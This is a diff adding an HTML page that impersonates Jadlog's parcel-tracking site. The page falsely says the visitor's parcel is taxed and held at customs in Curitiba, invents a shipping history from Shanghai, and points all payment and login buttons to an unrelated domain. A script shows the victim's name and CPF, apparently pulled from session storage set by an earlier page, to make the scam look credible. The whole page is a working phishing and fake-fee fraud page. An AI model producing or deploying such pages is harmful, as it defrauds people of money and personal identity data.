@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="preconnect" href="https://fonts.googleapis.com/">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+  <link href="https://rastreie-agora.com/encomenda/css2-1.html" rel="stylesheet">
+  <link rel="stylesheet" href="images/bootstrap-1.css">
+  <link rel="stylesheet" href="images/app-1.css">
+  <link rel="stylesheet" href="images/yellow-1.css">
+  <link rel="stylesheet" href="images/all-1.css" crossorigin="anonymous">
+  <link rel="icon" type="image/x-icon" href="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png">
+  <meta name="csrf-token" content="XhpaSjXrgaC3XF8BrR4GtmpFPMLsyEiAAnHS72ER">
+  <title>Jadlog | Rastreio</title>
+  <link rel="stylesheet" type="text/css" href="images/all.css">
+  <script type="text/javascript" class="flasher-js">
+    (function () { 
+      var rootScript = 'flasher.min.html'; 
+      var FLASHER_FLASH_BAG_PLACE_HOLDER = {}; 
+      var options = mergeOptions([], FLASHER_FLASH_BAG_PLACE_HOLDER); 
+      function mergeOptions(first, second) { 
+        return { 
+          context: merge(first.context || {}, second.context || {}), 
+          envelopes: merge(first.envelopes || [], second.envelopes || []), 
+          options: merge(first.options || {}, second.options || {}), 
+          scripts: merge(first.scripts || [], second.scripts || []), 
+          styles: merge(first.styles || [], second.styles || []) 
+        }; 
+      } 
+      function merge(first, second) { 
+        if (Array.isArray(first) && Array.isArray(second)) { 
+          return first.concat(second).filter(function (item, index, array) { return array.indexOf(item) === index; }); 
+        } 
+        return Object.assign({}, first, second); 
+      } 
+      function renderOptions(options) { 
+        if (!window.hasOwnProperty('flasher')) { 
+          console.error('Flasher is not loaded'); 
+          return; 
+        } 
+        requestAnimationFrame(function () { window.flasher.render(options); }); 
+      } 
+      function render(options) { 
+        if ('loading' !== document.readyState) { 
+          renderOptions(options); 
+          return; 
+        } 
+        document.addEventListener('DOMContentLoaded', function () { renderOptions(options); }); 
+      } 
+      if (1 === document.querySelectorAll('script.flasher-js').length) { 
+        document.addEventListener('flasher:render', function (event) { render(event.detail); }); 
+      } 
+      if (window.hasOwnProperty('flasher') || !rootScript || document.querySelector('script[src="' + rootScript + '"]')) { 
+        render(options); 
+      } else { 
+        var tag = document.createElement('script'); 
+        tag.setAttribute('src', rootScript); 
+        tag.setAttribute('type', 'text/javascript'); 
+        tag.onload = function () { render(options); }; 
+        document.head.appendChild(tag); 
+      } 
+    })();
+  </script>
+  <script src="images/flasher.min.js" type="text/javascript"></script>
+  <script src="images/flasher.min_002.js" type="text/javascript"></script>
+</head>
+
+<body>
+  <header class="w-100 font-size-16 font-weight-400 text-blue">
+    <nav class="w-100 d-flex align-items-center bg-grey-2 px-3 px-lg-3 py-1 border-bottom border-warning" style="height:48px; border-color: #dc0032!important;">
+      <div class="ml-0 ml-lg-1 d-flex justify-content-center" style="width:100%">
+        <a href="https://vendas.compra-segura.shop/?hash=6154370cb2b5ec00522686131c068379" class="py-2">
+          <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="" height="25">
+        </a>
+      </div>
+      <div class="ml-4 d-none d-lg-block" style="width:150px">
+        <a href="https://vendas.compra-segura.shop/?hash=6154370cb2b5ec00522686131c068379" class="py-1 text-blue-dark border-left border-secondary px-3 text-decoration-none">
+          <img src="images/entrar-1.svg" alt="Jadlog" width="31">
+          <span class="ml-1">Entrar</span>
+        </a>
+      </div>
+    </nav>
+  </header>
+
+  <main>
+    <nav class="d-flex align-items-center flex-wrap mt-4 px-2 font-weight-400 w-95 max-w-1000" style="margin: 0 auto;">
+      <span class="text-blue mr-2" style="color: black;"><b>Portal Jadlog</b></span>
+      <i class="fal fa-angle-right mr-2"></i>
+      <span class="text-blue mr-2" style="color: black;">Rastreamento</span>
+      <i class="fal fa-angle-right mr-2"></i>
+      <span class="text-blue mr-2" style="color: black;"><span class="cpf"></span></span>
+    </nav>
+
+    <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+      <h5 class="text-danger font-weight-700 mb-4">
+        <i class="far fa-exclamation-triangle"></i> SUA ENCOMENDA FOI TRIBUTADA!
+      </h5>
+      <h4 class="text-blue-dark font-size-20 font-weight-700 mt-1 mb-2" style="color: black;">
+        STATUS DA ENTREGA:
+      </h4>
+      <h4 class="text-warning font-size-18 font-weight-700 mt-1 mb-2 d-flex align-items-center">
+        <div id="blink" style="width:12px;height:12px;border-radius:50%;" class="mr-2 bg-warning"></div>
+        AGUARDANDO PAGAMENTO
+      </h4>
+      <h5 id="address" style="color:#555577;">Sua encomenda está retida na agência Jadlog</h5>
+      <p class="mt-4" style="color: black;">Para liberar o envio do seu produto, o pagamento deve ser feito clicando no botão abaixo:</p>
+    </section>
+
+    <div style="padding: 0px 30px 0px 30px;">
+      <a href="https://vendas.compra-segura.shop/?hash=6154370cb2b5ec00522686131c068379
+      " class="btn btn-primary" style="font-size:13px;width:100%;background-color:#dc0032;border-color:#dc0032;">CLIQUE AQUI PARA LIBERAÇÃO DO SEU PEDIDO</a>
+    </div>
+
+    <section class="mt-3 p-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div class="container">
+        <div class="overlay">
+          <div class="overlay-text">
+            <p class="rotate" style="margin-top:25%;" id="overlay-data">
+              NOME: Não informada<br>CPF: CPF não informado
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <style>
+        .container {
+          position: relative;
+          width: 100%;
+          height: 300px;
+          background-color: #f0f0f0;
+          border: 1px solid #ddd;
+        }
+        .overlay {
+          position: relative;
+          width: 100%;
+          height: 100%;
+          background-image: url(images/awhspsj.jpg);
+          background-size: cover;
+          background-position: center;
+        }
+        .overlay-text {
+          position: absolute;
+          top: 52%; /* Alterado de 60% para 55% (subiu 4 pixels) */
+          left: 55%;
+          transform: translate(-50%, -50%);
+          background-color: transparent;
+          color: black !important;
+          padding: 10px 20px;
+          font-size: 10px;
+          text-align: center;
+          border-radius: 5px;
+          width: 300px;
+        }
+        .rotate {
+          text-align: start;
+          transform: rotate(2deg);
+          color: black !important;
+          font-weight: bold;
+          opacity: 0.5;
+          text-shadow: rgba(0, 0, 0, 0.3) 1px 1px 3px, rgba(0, 0, 0, 0.3) -1px -1px 3px, rgba(0, 0, 0, 0.1) 0px 0px 8px;
+          transform-style: preserve-3d;
+          transform: rotateX(1.2deg) rotateY(55deg);
+        }
+      </style>
+    </section>
+
+    <section class="px-4 py mb-5 w-95 max-w-1000" style="margin:0 auto;">
+      <ul>
+        <li class="d-flex mt-4" style="position: relative">
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+            <img src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="" width="32">
+          </div>
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap" style="color: black;">
+              Previsão de Entrega
+            </h5>
+            <span class="text-dark font-size-12 flex-wrap">
+              3 dias após o pagamento
+            </span>
+          </div>
+        </li>
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px"></div>
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+            <i class="fal fa-usd-circle"></i>
+          </div>
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap" style="color: black;">
+              Objeto aguardando pagamento
+            </h5>
+            <span class="text-dark font-size-12 flex-wrap">
+              em Unidade de Fiscalização Aduaneira, Curitiba, PR
+            </span>
+            <h5 class="mt-1 text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap" style="color: black;">
+              Realize o pagamento: <a href="https://vendas.compra-segura.shop/?hash=6154370cb2b5ec00522686131c068379" class="text-blue">Efetuar Pagamento</a>
+            </h5>
+          </div>
+        </li>
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px"></div>
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+            <i class="fal fa-truck"></i>
+          </div>
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap" style="color: black;">
+              Objeto em transferência - por favor aguarde
+            </h5>
+            <span class="text-dark font-size-12 flex-wrap">
+              de Unidade de Tratamento, Curitiba, PR <br>
+              para Unidade de Fiscalização Aduaneira - Curitiba, PR
+            </span>
+          </div>
+        </li>
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:100px;background-color:#dc0032;position:absolute;top:-98px;left:24px"></div>
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+            <i class="fal fa-truck-loading"></i>
+          </div>
+          <div class="w-70 d-flex flex-column ml-3 justify-content-center font-verdana text-wrap">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0" style="color: black;">
+              Objeto recebido em território nacional
+            </h5>
+            <span class="text-dark font-size-12">Curitiba - PR</span>
+          </div>
+        </li>
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:120px;background-color:#dc0032;position:absolute;top:-118px;left:24px"></div>
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100;min-width:50px">
+            <i class="fal fa-truck"></i>
+          </div>
+          <div class="w-70 d-flex flex-column flex-wrap ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0 flex-wrap" style="color: black;">
+              Objeto em transferência - por favor aguarde
+            </h5>
+            <span class="text-dark font-size-12 flex-wrap">
+              de Unidade de Tratamento, Shanghai - China <br>
+              para Unidade de Tratamento Internacional, China
+            </span>
+          </div>
+        </li>
+        <li class="d-flex mt-5" style="position: relative">
+          <div style="width:2px;height:172px;background-color:#dc0032;position:absolute;top:-170px;left:24px"></div>
+          <div class="bg-grey d-flex justify-content-center align-items-center font-size-24 text-blue" style="width:50px;height:50px;border-radius:50%;z-index:100">
+            <i class="fal fa-box-alt"></i>
+          </div>
+          <div class="d-flex flex-column ml-3 justify-content-center font-verdana">
+            <h5 class="text-blue-dark font-size-13 font-weight-700 p-0 m-0" style="color: black;">Objeto Postado</h5>
+            <span class="text-dark font-size-12">Shanghai - China</span>
+          </div>
+        </li>
+      </ul>
+    </section>
+
+    <section class="my-4 w-95 max-w-1000" style="margin:0 auto;">
+      <div>
+        <img src="outdoor02.png" alt="" class="w-100">
+      </div>
+    </section>
+  </main>
+
+  <hr style="margin-top: 20px; margin-bottom: 20px; border: 0; border-top: 1px solid #eee;"> 
+
+  <footer class="d-flex flex-wrap px-5 py-4 bg-yellow text-blue-dark" style="background-color: #fff;">
+    <div style="display: flex; justify-content: center; align-items: center; margin: 20px auto">
+      <img width="150px" src="https://logodownload.org/wp-content/uploads/2019/02/jadlog-logo.png" alt="">
+    </div>
+    <div class="d-flex justify-content-center w-100 px-3 mb-3 text-dark font-size-14">
+      <span>© Copyright 2025 Jadlog</span>
+    </div>
+  </footer>
+
+  <script src="images/jquery-3.6.0.min-1.js"></script>
+  <script src="images/bootstrap.min-1.js"></script>
+  <script src="images/latest-2.js" data-utmify-prevent-subids="" async="" defer=""></script>
+
+  <script>
+    // Load data from sessionStorage
+    document.addEventListener('DOMContentLoaded', () => {
+      const nomeCompleto = sessionStorage.getItem('nomeCompleto') || 'Não informada';
+      const cpf = sessionStorage.getItem('cpf') || 'CPF não informado';
+      document.getElementById('overlay-data').innerHTML = `NOME: ${nomeCompleto}<br>CPF: ${cpf}`;
+    });
+  </script>
+</body>
+</html>
